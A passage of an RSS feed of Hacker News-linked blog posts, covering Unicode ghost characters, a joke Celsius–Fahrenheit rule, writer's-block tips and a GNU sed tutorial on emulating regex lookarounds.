https://blog.justanotherpm.com/content/images/size/w1000/2020/10/WhatsApp-Image-2020-10-30-at-9.18.21-PM.jpeg 1000w, https://blog.justanotherpm.com/content/images/2020/10/WhatsApp-Image-2020-10-30-at-9.18.21-PM.jpeg 1280w" sizes="(min-width: 720px) 720px"><figcaption>My home office setup.</figcaption></figure><ul><li><strong>Shutting my laptop's lid at the end of the day</strong> is a simple yet effective technique. I use it as a signal of my workday ending.</li></ul><h3 id="wishlist-">Wishlist:</h3><ul><li><a href="https://journals.sagepub.com/doi/abs/10.1177/0305735605050650">Research</a> shows that <strong>listening to specific types of music</strong> while working increases productivity. <a href="https://www.youtube.com/watch?v=GRxofEmo3HA">Classical music</a>, <a href="https://www.fastcodesign.com/3047398/want-to-be-more-productive-listen-to-the-sounds-of-nature">nature sounds</a>, <a href="https://www.youtube.com/watch?v=guXMb7zLblM">epic music</a> all seem to do the trick. I haven't tried any of them yet but will do soon. Some more playlists: <a href="https://www.reddit.com/r/productivity/comments/jiat03/a_playlist_with_strategic_variance_in_music_to/">Spotify</a>, <a href="https://www.youtube.com/watch?v=EC-46P4UUdA&amp;feature=youtu.be">Youtube</a>.</li><li><strong>Minimizing screen time </strong>helps your brain relax. Doing non-screen activities during breaks appears simple, but I haven't been able to do this consistently. I am either reading or watching something on a screen during my breaks.</li><li><strong>Adequate sleep</strong> is essential. Yet, I struggle to sleep and wake up early. I will get there soon-ish.</li><li><strong>Exercise and meditation</strong> calm the mind and fill you with positivity. But, need a high level of discipline, which I lack (at least as of now.)</li></ul><p>Being productive, especially in a home office setup, isn't easy and needs work. You might not believe me, but you will believe Paul J. Meyer (the pioneer of the self-improvement industry.)</p><blockquote>“Productivity is never an accident. It is always the result of a commitment to excellence, intelligent planning, and focused effort.” </blockquote>
    </div>
        
</article>                    
                </main>
</div>
        </div></div>]]>
            </description>
            <link>https://blog.justanotherpm.com/if-you-think-productivity-in-office-productivity-at-home-you-are-not-alone-but-that-can-be-changed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951167</guid>
            <pubDate>Sat, 31 Oct 2020 13:13:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Spectre Is Haunting Unicode]]>
            </title>
            <description>
<![CDATA[
Score 262 | Comments 113 (<a href="https://news.ycombinator.com/item?id=24951130">thread link</a>) | @polm23
<br/>
October 31, 2020 | https://www.dampfkraft.com/ghost-characters.html | <a href="https://web.archive.org/web/*/https://www.dampfkraft.com/ghost-characters.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In 1978 Japan's <a href="https://ja.wikipedia.org/wiki/%E7%B5%8C%E6%B8%88%E7%94%A3%E6%A5%AD%E7%9C%81">Ministry of Economy, Trade and
Industry</a>
established the encoding that would later be known as JIS X 0208, which still
serves as an important reference for all Japanese encodings. However, after the
JIS standard was released people noticed something strange - several of the
added characters had no obvious sources, and nobody could tell what they meant
or how they should be pronounced. Nobody was sure where they came from. These
are what came to be known as the ghost characters
(<a href="https://ja.wikipedia.org/wiki/%E5%B9%BD%E9%9C%8A%E6%96%87%E5%AD%97">幽霊文字</a>).</p>
<figure><a href="https://www.dampfkraft.com/by-id/a824aa10/ghostcanvas.jpg"><img src="https://www.dampfkraft.com/by-id/a824aa10/img/ghostcanvas.jpg.l.jpg"></a><figcaption>Be careful what you write. <a href="http://dl.ndl.go.jp/info:ndljp/pid/1312837">via the NDL</a>
</figcaption></figure>
<p>For a long time the ghost characters remained an unexplained and mostly
forgotten curiosity, but in 1997 an investigation was launched to discover
where they had come from.  While all characters in the JIS standard were
supposed to have a record of their sources, even when it existed it
wasn't very specific, typically just listing the document it was sourced from.</p>
<p>You'd think that listing the source would make tracking down the origins of the
characters easy, but it's important to clarify what counts as a "source" - one
of the more common sources for the ghost characters was the "Overview of
National Administrative Districts" (国土行政区画総覧), a comprehensive list of
place names in Japan. You might, as I initially did, imagine this to be a kind
of atlas, an oversize book with at most a few hundred pages. It turns out the
<a href="http://kokudo.or.jp/books/index.html">latest edition</a> is a seven volume set
with each volume having roughly nine hundred pages. Imagine tracking down a
single character without a page reference.</p>
<p>Despite the difficulty, the investigation into the ghost characters was
successful in discovering their origins - mostly. By interviewing the
catalogers involved in the creation of the standard, the investigators
established that some characters were inadvertently invented as mistakes in the
cataloging process. For example, 妛 was an error introduced while trying to
record "山 over 女". "山 over 女" occurs in the name of a particular place and
was thus suitable for inclusion in the JIS standard, but because they couldn't
print it as one character yet, 山 and 女 were printed separately, cut out, and
pasted onto a sheet of paper, and then copied. When reading the copy, the line
where the two little pieces of paper met looked like a stroke and was added to
the character by mistake. The original character
(<a href="https://ja.wiktionary.org/wiki/%F0%A1%9A%B4">𡚴</a>) was not added to JIS or
Unicode until much later and doesn't display on most sites for me.</p>
<figure><a href="https://www.dampfkraft.com/by-id/a824aa10/yuureimoji.png"><img src="https://www.dampfkraft.com/by-id/a824aa10/img/yuureimoji.png.l.png"></a><figcaption>The core ghost characters: 妛挧暃椦槞蟐袮閠駲墸壥彁
</figcaption></figure>
<p>In the end only one character had neither a clear source nor any historical
precedent: 彁. The most likely explanation is that it was created as a
misreading of the 彊 character, but no specific incident was uncovered.</p>
<p>Following the general adoption of the JIS standards these characters all made
their way into Unicode, which has its own <a href="https://ja.wikipedia.org/wiki/CJK%E7%B5%B1%E5%90%88%E6%BC%A2%E5%AD%97#%E5%B9%BD%E9%9C%8A%E6%BC%A2%E5%AD%97">separate set of ghost
characters</a>
introduced during CJK unification.</p>
<p>To sum up - in 1978 a series of small mistakes created some characters out of
nothing. The errors went undiscovered just long enough to be set in stone, and
now these ghosts are, at least in potential, a part of every computer on the
planet, lurking in the dark corners of character tables.</p>
<p>At this rate they'll presumably be with humanity forever. Ψ</p>
<p>References / related links:</p>
<ul>
<li><a href="https://www.wdic.org/w/WDIC/%E5%B9%BD%E9%9C%8A%E6%96%87%E5%AD%97">幽霊文字 ‐ 通信用語の基礎知識</a> - the most thorough online source, with citations from the 1997 investigation.</li>
<li><a href="http://www.asahi.com/special/kotoba/archive2015/moji/2011082400019.html">大正十二年の幽霊文字 - ことばマガジン：朝日新聞デジタル</a> - an example of 彁 mistakenly used in a digitized Taisho newspaper due to a faded printing of 彊.</li>
<li><a href="http://dic.nicovideo.jp/a/%E5%B9%BD%E9%9C%8A%E6%96%87%E5%AD%97">Nico Nico Douga's Wiki</a> treats each of them as the name of a youkai.</li>
<li><a href="http://www.xubing.com/cn/work/details/206?year=1991&amp;type=year#206">天书</a> or <a href="https://en.wikipedia.org/wiki/A_Book_from_the_Sky">A Book from the Sky</a>, a hand-printed book by Xu Bing using only made-up Chinese characters.</li>
</ul>
</div></div>]]>
            </description>
            <link>https://www.dampfkraft.com/ghost-characters.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951130</guid>
            <pubDate>Sat, 31 Oct 2020 13:07:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Temperature conversion for the lazy and simple-minded]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24951102">thread link</a>) | @dyno-might
<br/>
October 31, 2020 | https://dyno-might.github.io/2020/10/30/temperature-conversion-for-the-lazy-and-simple-minded/ | <a href="https://web.archive.org/web/*/https://dyno-might.github.io/2020/10/30/temperature-conversion-for-the-lazy-and-simple-minded/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        







<div>
    <div>
        <div>
            
            <p><strong>Oct 30, 2020</strong></p>
            
            <p>This is a new way to convert temperatures between Celsius and Fahrenheit. It’s <em>bad</em>. You shouldn’t use it if you have any other option.</p>

<p>If you want a little bit of a puzzle, here is the system as a plot:</p>

<p><img src="https://dyno-might.github.io/img/convert/convert.png" alt="conversion as lines"></p>

<p>Did you figure it out? Here’s the system in words:</p>

<blockquote>
  <p>For the numbers 4, 16, and 28, transposing digits switches from Celsius from Fahrenheit.</p>
</blockquote>

<p>If you want even more explanation, here’s the system as a diagram:</p>

<p><img src="https://dyno-might.github.io/img/convert/transpose.png" alt="conversion as transposition"></p>

<p>It’s a coincidence that these conversion points exist. It’s an even greater coincidence that they divide the range of temperatures in a convenient way.</p>

<table>
  <thead>
    <tr>
      <th>Range in C</th>
      <th>Range in F</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Less than 4°C</td>
      <td>Less Than 40°F</td>
      <td>Cold</td>
    </tr>
    <tr>
      <td>Between 4°C and 16°C</td>
      <td>Between 40°F and 61°F</td>
      <td>Cool</td>
    </tr>
    <tr>
      <td>Between 16°C and 28°C</td>
      <td>Between 61°F and 82°F</td>
      <td>Warm</td>
    </tr>
    <tr>
      <td>More than 28°C</td>
      <td>More than 82°F</td>
      <td>Hot</td>
    </tr>
  </tbody>
</table>

<p>As an example, suppose you are familiar with Celsius and don’t know how to interpret 71°F. Since this is around halfway between 61°F and 82°F you know it is also about halfway between 16°C and 28°C.</p>



<p><strong>Question:</strong> Did you lie a little bit about the numbers?</p>

<p><strong>Answer:</strong> Yes, but by less than 1°F.</p>

<p><strong>Question:</strong> Don’t I have to remember “4, 16, 28”?</p>

<p><strong>Answer:</strong> Yes. But it’s not that hard! You have 4, then 4 + 12, and 4 + 12 + 12.</p>

<p><strong>Question:</strong> Isn’t this a bad system for me, smart person who can easily calculate F=(9/5)C + 32 and C=(5/9)(F - 32) in my head?</p>

<p><strong>Answer:</strong> Yes.</p>

<p><strong>Question:</strong> How do I use this system to convert other temperatures?</p>

<p><strong>Answer:</strong> You don’t.</p>


        </div>

        

        
        
    </div>
</div>


    </div>
</section></div>]]>
            </description>
            <link>https://dyno-might.github.io/2020/10/30/temperature-conversion-for-the-lazy-and-simple-minded/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951102</guid>
            <pubDate>Sat, 31 Oct 2020 13:04:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Demo showing technology to reduce video streaming costs by up-to 90%]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24950945">thread link</a>) | @Anil1331
<br/>
October 31, 2020 | https://api.peervadoo.com/test | <a href="https://web.archive.org/web/*/https://api.peervadoo.com/test">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><label for="url">Url:</label>
                    
		</p>
                </div></div>]]>
            </description>
            <link>https://api.peervadoo.com/test</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950945</guid>
            <pubDate>Sat, 31 Oct 2020 12:41:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elektra 0.9.3 Release]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950895">thread link</a>) | @mpranj
<br/>
October 31, 2020 | https://www.libelektra.org/news/0.9.3-release | <a href="https://web.archive.org/web/*/https://www.libelektra.org/news/0.9.3-release">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.libelektra.org/news/0.9.3-release</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950895</guid>
            <pubDate>Sat, 31 Oct 2020 12:34:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overcoming Writer's Block]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950777">thread link</a>) | @thecodrr
<br/>
October 31, 2020 | https://blog.streetwriters.co/overcoming-writers-block/ | <a href="https://web.archive.org/web/*/https://blog.streetwriters.co/overcoming-writers-block/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Who is more to be pitied, a writer bound and gagged by policemen or one living in perfect freedom who has nothing more to say?</p><p><em><span data-preserver-spaces="true">― </span></em>Kurt Vonnegut</p></blockquote><p><span data-preserver-spaces="true">I remember June of 2015. I came back from University, sat down to write in my daily journal, and picked up my pen. I stared at the blank page with a sense of impending doom. Writer's block. It was here. For so long, I had evaded its dark clutches, but it had caught up to me. I knew one day it would.</span></p><p><span data-preserver-spaces="true">Writer's block. It is one of those things that writers dread the most. Something they cannot avoid.</span></p><h2><span data-preserver-spaces="true">What is Writer's Block?</span></h2><p><span data-preserver-spaces="true">Imagine the most delicious food cooked by the best chefs in town. Now imagine yourself sitting down to eat all that food but not being able to.</span></p><p><span data-preserver-spaces="true">For various reasons, the writer's block has been the most hated enemy among writers. You sit down to write but nothing comes out. You sit there staring at the blank page for hours, days, or even months. The right words, the right idea, the right passion always evades you. Welcome to writer's block.</span></p><h2><span data-preserver-spaces="true">How to Overcome Writer's Block?</span></h2><p><span data-preserver-spaces="true">I remember going to the gym, going to the park, and even going to a nearby swamp to watch little frogs jump around. Nothing worked. I came back to my room, picked up the pen, but still the same feeling of doom.</span></p><p><span data-preserver-spaces="true">I could not <em>bleed</em> as Hemingway said. My ink had dried. It seemed I would never be able to write. I had forgotten my language.</span></p><p><span data-preserver-spaces="true">Overcoming writer's block is providential. What may trigger the inspiration in your soul is unknown. All you can do is try.</span></p><h2><span data-preserver-spaces="true">Finding the Cause</span></h2><p><em><span data-preserver-spaces="true">Alright. Therapy time.</span></em></p><p><span data-preserver-spaces="true">Try answering these questions to yourself (or in the comments below):</span></p><ol><li><span data-preserver-spaces="true">Do I criticize myself too much? Do I see faults and imperfections in whatever I write?</span></li><li><span data-preserver-spaces="true">Am I comparing myself to other writers, envying their creativity?</span></li><li><span data-preserver-spaces="true">Am I afraid of criticism?</span></li><li><span data-preserver-spaces="true">Do I depend upon compliments and praise from others?&nbsp;</span></li><li><span data-preserver-spaces="true">Am I losing my desire to write? Am I tired, overworked, or demotivated?</span></li><li><span data-preserver-spaces="true">Am I waiting for the perfect story to come flashing down on me like a lightning bolt?</span></li></ol><p><span data-preserver-spaces="true">Do not be demotivated if your answers are yes. No one is perfect. The real question is, what can you do about it? You found the cause, but you still have no remedy.</span></p><p><span data-preserver-spaces="true">Here is a list of a few things I tried. Remember, though, what may trigger your inspiration depends on you.</span></p><h2><span data-preserver-spaces="true">1. Make a Routine</span></h2><p><span data-preserver-spaces="true">I slept at 4 AM, woke around noon. My lunch was my breakfast. I never set a fixed time for anything, much less writing. And one day, it stopped.</span></p><p><span data-preserver-spaces="true">Set a fixed time every day for writing. It will help you find focus. I found the morning to be the best time. If this works for you, you will look forward to the time you spend writing.</span></p><h2><span data-preserver-spaces="true">2. Write Imperfectly</span></h2><blockquote><p>There is no such thing as good writing, only good rewriting.</p><p><em><span data-preserver-spaces="true">― </span></em>Robert Graves</p></blockquote><p><span data-preserver-spaces="true">I imagine perfection to be a disease. When I am born imperfect, destined to make mistakes, how am I supposed to find perfection in writing? Nowadays, I pick my pen and let it do its work.</span></p><p><span data-preserver-spaces="true">Stop thinking about perfection. Just let everything flow. It may be a horrible piece, but you did it. Keep writing.</span></p><h2><span data-preserver-spaces="true">3. Do Something Else</span></h2><p><span data-preserver-spaces="true">If you are feeling stuck, demotivated, and finding writing to be a chore. It is time for a change.</span></p><p><span data-preserver-spaces="true">Monotony is the bane of creativity. Just leave everything, and find something else to do. You will find your creativity and passion renewed.</span></p><figure><img loading="lazy" data-pagespeed-lazy-src="https://blog.streetwriters.co/media/posts/24//L08116-13-lr-1-1.jpg" sizes="(max-width: 1200px) 100vw, 1200px" data-pagespeed-lazy-srcset="https://blog.streetwriters.co/media/posts/24//responsive/L08116-13-lr-1-1-xs.jpg 300w, https://blog.streetwriters.co/media/posts/24//responsive/L08116-13-lr-1-1-sm.jpg 480w, https://blog.streetwriters.co/media/posts/24//responsive/L08116-13-lr-1-1-md.jpg 768w, https://blog.streetwriters.co/media/posts/24//responsive/L08116-13-lr-1-1-xl.jpg 1200w, https://blog.streetwriters.co/media/posts/24//responsive/L08116-13-lr-1-1-xxl.jpg 1600w, https://blog.streetwriters.co/media/posts/24//responsive/L08116-13-lr-1-1-xxxl.jpg 2560w" alt="" width="1977" height="1533" src="https://blog.streetwriters.co/pagespeed_static/1.JiBnMqyl6S.gif" onload="pagespeed.lazyLoadImages.loadIfVisibleAndMaybeBeacon(this);" onerror="this.onerror=null;pagespeed.lazyLoadImages.loadIfVisibleAndMaybeBeacon(this);"><figcaption>A representation of writer's block by&nbsp;<a href="https://en.wikipedia.org/wiki/Leonid_Pasternak" title="Leonid Pasternak">Leonid Pasternak</a>&nbsp;(1862 – 1945)</figcaption></figure><h2><span data-preserver-spaces="true">4. Force Yourself to Write</span></h2><blockquote><p>The only cure for not being able to write is to write.</p><p>― Kaylin R. Boyd</p></blockquote><p><span data-preserver-spaces="true">Procrastination may be a reason you are not writing anything. Fix a time, ten, fifteen, or thirty minutes. And then write without pause.&nbsp;</span></p><p><span data-preserver-spaces="true">Forcing yourself may be difficult. For this, you can try&nbsp;</span><a target="_blank" href="https://callofwriting.com/" rel="noopener"><span data-preserver-spaces="true">the Call of Writing app</span></a><span data-preserver-spaces="true">:&nbsp;</span></p><ol><li><span data-preserver-spaces="true">You can fix the time or number of words in the app.</span></li><li><span data-preserver-spaces="true">It awards you a score whenever you complete a challenge.</span></li><li><span data-preserver-spaces="true">You can compete with other writers.&nbsp;</span></li></ol><h2><span data-preserver-spaces="true">5. Start Writing from the Middle of a Story</span></h2><p><span data-preserver-spaces="true">It is a daunting task to start a story. The beginnings are the most difficult. Try starting a story from a fight scene, or a dialogue. Beginning a story abruptly will create suspense, opening up a thousand possibilities. You will see your pen flow.</span></p><h2><span data-preserver-spaces="true">6. Write with a Pen</span></h2><p><span data-preserver-spaces="true">Having a pen in your hand will give you a sense of purpose. Pen, ink, and paper have been tools of writing for centuries. They have a history.</span></p><p><span data-preserver-spaces="true">I have written on paper and my phone. There is something novel about writing with a pen; in watching the words materialize in front of you.</span></p><p><span data-preserver-spaces="true">Nothing beats the feel of a pen dragging on paper.</span></p><h2><span data-preserver-spaces="true">7. Make an Outline</span></h2><p><span data-preserver-spaces="true">Writer's block in the middle of your story is the most demotivating experience ever. Your protagonist is in the middle of a fight, but you are stuck. His sword is raised in the air, poised to strike upon the antagonist, but you cannot find the words.</span></p><p><span data-preserver-spaces="true">It is time to outline your story. Take a birds-eye view of the entire plot. Highlight the critical points, and continue the story.</span></p><h2><span data-preserver-spaces="true">8. Write Something Else</span></h2><p><span data-preserver-spaces="true">I have about ten side projects going on simultaneously. Never do I find myself bored and demotivated. If one piece is not working out, I pick up another.</span></p><p><span data-preserver-spaces="true">If the story is boring you, try writing a new one. Come back to it after a week. You will find new inspiration to continue the story.</span></p><div><p><strong><a href="https://blog.streetwriters.co/top-short-story-ideas/">Top 25 Short Story Writing Ideas</a></strong></p><p>Sometimes you want to write a story. You have energy, motivation, the right frame of mind, but the right story idea or the right topic remains out of your reach. You get stuck in a state where you are throwing the net in your sub-consciousness and trying to catch the right fish, but the catch always eludes you. If you are stuck in such a cycle, you are not alone. The best way to overcome this condition is to r...</p><p><a href="https://blog.streetwriters.co/top-short-story-ideas/">Continue reading</a></p></div><h2><span data-preserver-spaces="true">9. You are too Conscious About Public Opinion</span></h2><p><span data-preserver-spaces="true">The first time I presented a poem of mine, I basked in the praise. I did not realize the problem until it had become a problem. I always sought others' approval for my ideas before I published any piece.</span></p><p><span data-preserver-spaces="true">Pause. Breathe. Bring into focus your purpose for writing. Is it for yourself or others? Are you going to let others dictate your creativity?</span></p><p><span data-preserver-spaces="true">You have incomparable potential waiting for your pen to move. Forget others. Forget the audience. Focus on how you want your story to be.&nbsp;</span><em><span data-preserver-spaces="true">Write.</span></em></p><h2><span data-preserver-spaces="true">10. Move away from Distractions</span></h2><p><span data-preserver-spaces="true">Your mind is your biggest enemy. You find it wandering. You bring it back only for it to get lost again. It is the most stubborn organ in humans.</span></p><p><span data-preserver-spaces="true">Find a distraction-free place, and sit down. Close your eyes, and try to focus on what you have to write. What is your idea? Concentrate.</span></p><p><em><span data-preserver-spaces="true">Write.</span></em></p><h2><span data-preserver-spaces="true">11. Start Keeping Notes</span></h2><p><span data-preserver-spaces="true">Driving, walking, eating, in the bathroom, or at a party; ideas can come anywhere. When they arrive, jot them down.</span></p><p><span data-preserver-spaces="true">Your story will be born at the most unexpected time. You do not want to be without a pen at that moment.</span></p><h2><span data-preserver-spaces="true">Conclusion</span></h2><p><span data-preserver-spaces="true">If you cannot write today, do not be discouraged. Your time will come. Do not give up. Words not flowing today will flow tomorrow.</span></p><p>If you have already tried all of the above, you can check these resources for further help:</p><p>1. <a href="https://blog.bookbaby.com/2016/04/21-tips-to-beat-writers-block/">21 Tips to Beat Writer's Block (Has a really cool infographic)</a><br>2. <a href="https://www.writingroutines.com/overcome-writers-block/">What Great Writers Do About Writer's Block</a></p></div></div>]]>
            </description>
            <link>https://blog.streetwriters.co/overcoming-writers-block/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950777</guid>
            <pubDate>Sat, 31 Oct 2020 12:13:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Emulating regexp lookarounds in GNU sed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950673">thread link</a>) | @todsacerdoti
<br/>
October 31, 2020 | https://learnbyexample.github.io/sed-lookarounds/ | <a href="https://web.archive.org/web/*/https://learnbyexample.github.io/sed-lookarounds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    

    <div>
      <p>This <a href="https://stackoverflow.com/q/64371281/4082052">stackoverflow Q&amp;A</a> got me thinking about various ways to construct a solution in <code>GNU sed</code> if lookarounds are needed.</p>
<blockquote>
<p><img src="https://learnbyexample.github.io/images/info.svg" alt="info"> Only single line (with newline as the line separator) processing is presented here. Equivalent lookaround syntax with <code>grep -P</code> or <code>perl</code> is also shown for comparison. Cases where multiple lines and/or ASCII NUL characters are present in the pattern space is left as an exercise.</p>
</blockquote>
<h2 id="filtering">Filtering<a href="#filtering" aria-label="Anchor link for: filtering">🔗</a></h2>
<p>Here, you only need to decide whether the input line has to be matched or not. <code>sed</code> supports grouping commands inside <code>{}</code> that should be executed only if a filtering condition is matched. The condition could be negated by adding a <code>!</code> character. In this way, you can emulate chaining of multiple positive and/or negative lookaround conditions.</p>
<pre><code><span>$ cat items.txt
</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>
apple=</span><span>50 </span><span>;per kg
a,b,c,d
;foo xyz3

</span><span># filter lines containing a digit character followed by a ; character
# lookaround isn't needed here
# same as: grep '[0-9].*;' or grep -P '\d(?=.*;)'
</span><span>$ sed </span><span>-</span><span>n </span><span>'/[0-9].*;/p'</span><span> items.txt
apple=</span><span>50 </span><span>;per kg

</span><span># filter lines containing both digit and ; characters in any order
# same as: grep -P '^(?=.*;).*\d'
</span><span>$ sed </span><span>-</span><span>n </span><span>'/;/{ /[0-9]/p }'</span><span> items.txt
apple=</span><span>50 </span><span>;per kg
;foo xyz3

</span><span># filter lines containing both digit and ; characters
# but not if the line also contains character a
# same as: grep -P '^(?!.*a)(?=.*;).*\d'
</span><span>$ sed </span><span>-</span><span>n </span><span>'/a/!{ /;/{ /[0-9]/p } }'</span><span> items.txt
;foo xyz3
</span></code></pre>
<p>For some cases, multiple condition check like the previous examples is not enough. For example, filter a line if it contains <code>par</code> as long as <code>cart</code> isn't present later in the line. Presence of <code>cart</code> earlier in the line shouldn't affect the outcome. In such cases, you can first change the input line to add a newline character wherever <code>cart</code> is present and then construct a condition such that it depends on the newline character instead of <code>cart</code>. If a match is found, delete all the newline characters and then print the line.</p>
<pre><code><span>$ s=</span><span>'par carted spare cart park city'

</span><span># same as: grep -P 'par(?!.*cart)'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>n </span><span>'s/cart/\n&amp;/g; /par[^\n]*$/{ s/\n//g; p }'</span><span>
par carted spare cart park city
</span></code></pre>
<blockquote>
<p><img src="https://learnbyexample.github.io/images/info.svg" alt="info"> Newline is a safe character to choose for default line by line processing, as <code>sed</code> removes it from the pattern space. If you are processing a pattern space that contains newline character (for example: <code>-z</code> option, <code>N</code> command, etc), then you can still perform this trick as long as you know a character that is guaranteed to be absent from the input data. </p>
</blockquote>
<h2 id="substitution">Substitution<a href="#substitution" aria-label="Anchor link for: substitution">🔗</a></h2>
<p>In previous section, you saw how to modify input line with newline character to make it easier to construct a lookaround condition. This trick comes in handy for substitution as well. However, for search and replace cases, you also need to emulate zero-width nature of lookarounds. To achieve this, you can make use of <code>t</code> command to construct a loop that performs substitution as long as a match is found. See my chapter on <a href="https://learnbyexample.github.io/learn_gnused/control-structures.html">Control structures</a> for more details about branching commands in <code>GNU sed</code>.</p>
<p>Here's an example of looping. Aim is to delete <code>fin</code> from the given input recursively.</p>
<pre><code><span># manual repetition, assuming count is known
</span><span>$ echo </span><span>'coffining' </span><span>|</span><span> sed </span><span>'s/fin//'</span><span>
cofing
$ echo </span><span>'coffining' </span><span>|</span><span> sed </span><span>'s/fin//; s///'</span><span>
cog

</span><span># :loop marks the 's' command with label 'loop'
# tloop will jump to label 'loop' as long as the substitution succeeds
</span><span>$ echo </span><span>'coffining' </span><span>|</span><span> sed </span><span>':loop s/fin//; tloop'</span><span>
cog
</span></code></pre><h3 id="negative-lookarounds">Negative lookarounds<a href="#negative-lookarounds" aria-label="Anchor link for: negative-lookarounds">🔗</a></h3>
<p>Some cases can be solved by performing substitution only if a condition is first satisfied. Note that <code>{}</code> grouping is optional here.</p>
<pre><code><span># same as: perl -ne 'print if s/^(?!;).*?\K[ ,].*//'
</span><span>$ sed </span><span>-</span><span>n </span><span>'/^;/! s/[ ,].*//p'</span><span> items.txt
</span><span>1</span><span>
apple=</span><span>50</span><span>
a
</span></code></pre>
<p>Change <code>foo</code> to <code>[baz]</code> only if it is not followed by a digit character. Note that <code>foo</code> at the end of string also satisfies this assertion. <code>foofoo</code> has two matches as the assertion is zero-width in nature, i.e. it doesn't consume characters. Here, the first step is inserting a newline character between <code>foo</code> and a digit character. Then change all <code>foo</code> to <code>[baz]</code> as long as it is at the end of string or if it isn't followed by a newline character. Once the loop ends, remove all the newline characters.</p>
<pre><code><span>$ s=</span><span>'hey food! foo42 foot5 foofoo'

</span><span># same as: perl -pe 's/foo(?!\d)/[baz]/g'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>E </span><span>'s/(foo)([0-9])/\1\n\2/g;
                      :a s/foo([^\n]|$)/[baz]\1/; ta;
                      s/\n//g'</span><span>
hey [baz]d! foo42 [baz]t5 [baz][baz]
</span></code></pre>
<p>Change <code>foo</code> to <code>[baz]</code> only if it is not preceded by <code>_</code> character. <code>foo</code> at the start of string is matched as well.</p>
<pre><code><span>$ s=</span><span>'foo _foo 42foofoo'

</span><span># same as: perl -pe 's/(?&lt;!_)foo/[baz]/g'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>E </span><span>'s/(_)(foo)/\1\n\2/g;
                      :a s/(^|[^\n])foo/\1[baz]/; ta;
                      s/\n//g'
</span><span>[baz] _foo </span><span>42</span><span>[baz][baz]
</span></code></pre>
<p>Replace <code>par</code> with <code>[xyz]</code> as long as <code>s</code> character is not present later in the input. This assumes that the assertion doesn't conflict with the search pattern, for example <code>s</code> will not conflict with <code>par</code> but would affect if it was <code>r</code> and <code>par</code>.</p>
<pre><code><span>$ s=</span><span>'par spare part party'

</span><span># same as: perl -pe 's/par(?!.*s)/[xyz]/g'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>E </span><span>'s/s/&amp;\n/g;
                      :a s/par([^\n]*)$/[xyz]\1/; ta;
                      s/\n//g'</span><span>
par s[xyz]e [xyz]t [xyz]ty
</span></code></pre>
<p>Replace all empty fields with <code>NA</code> for csv input (assuming no embedded comma, newline characters, etc).</p>
<pre><code><span>$ s=</span><span>',1,,,two,3,,,'

</span><span># same as: perl -lpe 's/(?&lt;![^,])(?![^,])/NA/g'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>E </span><span>':a s/,,/,NA,/g; ta; s/^,/NA,/; s/,$/,NA/'
</span><span>NA</span><span>,</span><span>1</span><span>,</span><span>NA</span><span>,</span><span>NA</span><span>,two,</span><span>3</span><span>,</span><span>NA</span><span>,</span><span>NA</span><span>,</span><span>NA
</span></code></pre>
<p>Replace if <code>go</code> is not there between <code>at</code> and <code>par</code>.</p>
<pre><code><span>$ s=</span><span>'fox,cat,dog,parrot,dot,park,go,spare'

</span><span># same as: perl -pe 's/at((?!go).)*par/[xyz]/'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>'s/go/\n&amp;/g; s/at[^\n]*par/[xyz]/; s/\n//g'</span><span>
fox,c[xyz]k,go,spare
</span></code></pre><h3 id="positive-lookarounds">Positive lookarounds<a href="#positive-lookarounds" aria-label="Anchor link for: positive-lookarounds">🔗</a></h3>
<p>Surround fields with <code>[]</code> except first and last fields for csv input (assuming no embedded comma, newline characters, etc). With positive lookaround emulation, the modified string may continue to satisfy the matching condition, resulting in infinite looping. In this example, the fields themselves may contain <code>[]</code> characters, so you cannot use them to prevent infinite loop. The newline character trick comes in handy again.</p>
<pre><code><span>$ s=</span><span>'1,t[w]o,[3],f[ou]r,5'

</span><span># same as: perl -pe 's/(?&lt;=,)[^,]+(?=,)/[$&amp;]/g'
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> sed </span><span>-</span><span>E </span><span>':a s/,([^,\n]+),/,\n[\1],/g; ta; s/\n//g'
</span><span>1</span><span>,[t[w]o],[[</span><span>3</span><span>]],[f[ou]r],</span><span>5
</span></code></pre>
